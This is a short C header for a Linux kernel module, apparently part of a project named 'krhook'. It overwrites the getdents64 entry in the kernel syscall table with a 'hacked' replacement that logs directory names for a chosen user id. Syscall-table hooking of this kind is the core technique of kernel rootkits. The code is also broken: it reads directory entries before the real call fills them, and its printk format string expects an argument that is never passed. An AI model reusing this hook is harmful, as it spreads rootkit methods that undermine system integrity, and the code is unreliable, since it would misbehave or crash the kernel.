#ifndef KRHOOK_KR_DIR
#define KRHOOK_KR_DIR

typedef long (*TYPE_getdents)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);

static TYPE_getdents old_getdents;

// the hacked sys_getdents64
asmlinkage long new_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) {        
    char *path_buf = kzalloc(MAX_PATH, GFP_KERNEL);
    strncpy_from_user(path_buf, dirp->d_name, MAX_PATH);
    if(path_buf[0] != '.' && myuid == current_uid().val) {
      printk(KERN_ALERT "kr_dir: %s %d\n", path_buf);
    }
    kfree(path_buf);
    return old_getdents(fd, dirp, count);
}

#define KR_GETDENTS_INIT()                                                                    \
    old_getdents                        = (TYPE_getdents)sys_call_table_ptr[__NR_getdents64]; \
    sys_call_table_ptr[__NR_getdents64] = (TYPE_getdents)new_getdents;

#define KR_GETDENTS_CLEAN()                                    \
    if (sys_call_table_ptr[__NR_getdents64] == new_getdents) { \
        sys_call_table_ptr[__NR_getdents64] = old_getdents;    \
    }

#endif /* KRHOOK_KR_DIR */

// help link:
// https://blog.csdn.net/lhj0711010212/article/details/8707735